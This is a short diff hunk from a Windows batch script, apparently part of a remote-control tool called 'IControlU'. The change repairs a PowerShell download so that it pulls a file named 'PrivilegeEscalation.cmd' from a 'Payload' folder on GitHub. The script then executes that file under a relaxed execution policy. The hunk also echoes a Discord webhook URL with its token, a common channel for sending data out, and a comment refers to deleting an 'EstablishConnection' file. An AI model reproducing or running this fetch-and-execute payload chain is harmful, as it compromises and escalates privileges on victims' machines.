@@ -13,7 +13,7 @@ echo https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh3
 
 @REM Download required files
 
-powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/cbaa6325aedbd50d3af60ba844fc418220758562/Payload/PrivilegeEscalation.cmd' -OutFile 'PrivilegeEscalation.cmd'"
+powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ReylanTeo/IControlU/main/Payload/PrivilegeEscalation.cmd' -OutFile 'PrivilegeEscalation.cmd'"
 powershell -ExecutionPolicy RemoteSigned -File "PrivilegeEscalation.cmd"
 
 @REM @REM Delete the EstablishConnection file
